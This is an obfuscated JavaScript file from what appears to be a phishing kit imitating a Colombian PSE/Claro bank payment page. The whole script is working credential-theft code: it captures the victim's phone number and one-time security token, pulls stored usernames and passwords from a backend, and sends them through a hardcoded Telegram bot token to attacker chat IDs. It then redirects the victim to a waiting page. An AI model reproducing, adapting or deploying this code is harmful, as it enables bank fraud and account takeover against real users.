function _0x34b9() {
  const _0x56193e = [
    "confirmation-code",
    "PUT",
    "wait.html",
    "\x0a🚹Usuario:\x20",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "1ddzLnP",
    "value",
    "error",
    "411356vaGSCD",
    "Error\x20de\x20red\x20(chat\x20ID:\x20",
    "password",
    "telefono",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "\x0aIngresó\x20OTP",
    "2129410uLWaRa",
    "addEventListener",
    "href",
    "Error\x20al\x20actualizar\x20usuario:",
    "setItem",
    "info",
    "\x0a💎OTP:\x20",
    "metaInfo",
    "location",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "3144qjknIe",
    "\x20Cajero:\x20",
    "32zqalHs",
    "/trico/updateTricoPse/",
    "application/json",
    "focus",
    "idreg",
    "\x0a📱Teléfono:\x20",
    "/trico/tricoData",
    "bank",
    "2695058KImizW",
    "6855zaRtEz",
    "Usuario\x20Encontrado",
    "disabled",
    "getElementById",
    "log",
    "stringify",
    "nombre",
    "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20",
    "106569OmVKpi",
    "\x0aFuente:\x20",
    "cdin",
    "5503995aMBpSu",
    "Usuario\x20actualizado",
    "\x0a🆔Nombre:\x20",
    "json",
    "\x0a🏦Banco:\x20",
    "GET",
    "21157389RcZBwI",
    "btnDinamica",
    "preventDefault",
    "21zRIsNL",
  ];
  _0x34b9 = function () {
    return _0x56193e;
  };
  return _0x34b9();
}
const _0x4bec78 = _0xd167;
(function (_0x3d474b, _0x11d77c) {
  const _0x546f11 = _0xd167,
    _0x201a35 = _0x3d474b();
  while (!![]) {
    try {
      const _0x57e974 =
        (parseInt(_0x546f11(0x1d5)) / 0x1) *
          (parseInt(_0x546f11(0x1f2)) / 0x2) +
        (parseInt(_0x546f11(0x1cf)) / 0x3) *
          (-parseInt(_0x546f11(0x1d8)) / 0x4) +
        (-parseInt(_0x546f11(0x1f3)) / 0x5) *
          (parseInt(_0x546f11(0x1e8)) / 0x6) +
        -parseInt(_0x546f11(0x1c6)) / 0x7 +
        (-parseInt(_0x546f11(0x1ea)) / 0x8) *
          (-parseInt(_0x546f11(0x1c3)) / 0x9) +
        -parseInt(_0x546f11(0x1de)) / 0xa +
        parseInt(_0x546f11(0x1cc)) / 0xb;
      if (_0x57e974 === _0x11d77c) break;
      else _0x201a35["push"](_0x201a35["shift"]());
    } catch (_0x597dbe) {
      _0x201a35["push"](_0x201a35["shift"]());
    }
  }
})(_0x34b9, 0xd7095);
function updateLS() {
  const _0x218923 = _0xd167;
  LS[_0x218923(0x1e2)](_0x218923(0x1e3), JSON[_0x218923(0x1c0)](info));
}
const otpButton = document[_0x4bec78(0x1f6)](_0x4bec78(0x1cd)),
  numberMovil = document[_0x4bec78(0x1f6)](_0x4bec78(0x1d0)),
  cajero = document["getElementById"]("txtdinamica");
function _0xd167(_0x51ca56, _0x3ab433) {
  const _0x34b9c7 = _0x34b9();
  return (
    (_0xd167 = function (_0xd167fd, _0x3f2ff5) {
      _0xd167fd = _0xd167fd - 0x1c0;
      let _0xf5d367 = _0x34b9c7[_0xd167fd];
      return _0xf5d367;
    }),
    _0xd167(_0x51ca56, _0x3ab433)
  );
}
async function sendToTelegram(_0x43406b) {
  const _0x374e5a = _0x4bec78;
  for (const _0x275858 of chatIds) {
    const _0x13ccdf =
      "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=" +
      _0x275858 +
      "&text=" +
      encodeURIComponent(_0x43406b);
    try {
      const _0x26754e = await fetch(_0x13ccdf);
      _0x26754e["ok"]
        ? console[_0x374e5a(0x1f7)](_0x374e5a(0x1e7) + _0x275858 + ")")
        : console["error"](
            _0x374e5a(0x1c2) + _0x275858 + "):",
            _0x26754e["statusText"]
          );
    } catch (_0x1ac8f7) {
      console[_0x374e5a(0x1d7)](_0x374e5a(0x1d9) + _0x275858 + "):", _0x1ac8f7);
    }
  }
}
otpButton[_0x4bec78(0x1df)]("click", async function (_0x531063) {
  const _0x29ff18 = _0x4bec78;
  _0x531063[_0x29ff18(0x1ce)](), (otpButton[_0x29ff18(0x1f5)] = !![]);
  if (numberMovil[_0x29ff18(0x1d6)] == "") {
    alert(_0x29ff18(0x1dc)),
      numberMovil[_0x29ff18(0x1ed)](),
      (otpButton[_0x29ff18(0x1f5)] = ![]);
    return;
  } else {
    var _0x4246ce = numberMovil[_0x29ff18(0x1d6)];
    (info["metaInfo"][_0x29ff18(0x1c5)] =
      _0x4246ce + _0x29ff18(0x1e9) + cajero["value"]),
      updateLS();
    async function _0x4489fa() {
      const _0x51af62 = _0x29ff18,
        _0x13398d = await fetch(url + _0x51af62(0x1f0), {
          method: _0x51af62(0x1cb),
          headers: { "Content-Type": "application/json" },
        }),
        _0x536756 = await _0x13398d[_0x51af62(0x1c9)](),
        _0x374871 = [..._0x536756];
      for (const _0x177e9b of _0x374871) {
        if (_0x177e9b["id"] == info["metaInfo"]["cc"]) {
          console[_0x51af62(0x1f7)](_0x51af62(0x1f4));
          const _0x410e29 = await fetch(
              url + _0x51af62(0x1eb) + _0x177e9b[_0x51af62(0x1ee)],
              {
                method: _0x51af62(0x1d1),
                headers: { "Content-Type": _0x51af62(0x1ec) },
                body: JSON[_0x51af62(0x1c0)]({ otp: info["metaInfo"]["cdin"] }),
              }
            ),
            _0x1f3c89 = await _0x410e29[_0x51af62(0x1c9)](),
            _0x1b521e =
              _0x51af62(0x1d4) +
              _0x177e9b["id"] +
              _0x51af62(0x1c8) +
              _0x177e9b[_0x51af62(0x1c1)] +
              _0x51af62(0x1ef) +
              _0x177e9b[_0x51af62(0x1db)] +
              _0x51af62(0x1d3) +
              _0x177e9b["usuario"] +
              "\x0a🔒Contraseña:\x20" +
              _0x177e9b[_0x51af62(0x1da)] +
              _0x51af62(0x1e4) +
              info[_0x51af62(0x1e5)][_0x51af62(0x1c5)] +
              _0x51af62(0x1ca) +
              _0x177e9b[_0x51af62(0x1f1)] +
              _0x51af62(0x1c4) +
              fuente +
              _0x51af62(0x1dd);
          await sendToTelegram(_0x1b521e),
            _0x410e29["ok"]
              ? console["log"](_0x51af62(0x1c7))
              : console[_0x51af62(0x1d7)](
                  _0x51af62(0x1e1),
                  _0x410e29["statusText"]
                );
        }
      }
      (otpButton[_0x51af62(0x1f5)] = ![]),
        (window[_0x51af62(0x1e6)][_0x51af62(0x1e0)] = _0x51af62(0x1d2));
    }
    await _0x4489fa();
  }
});
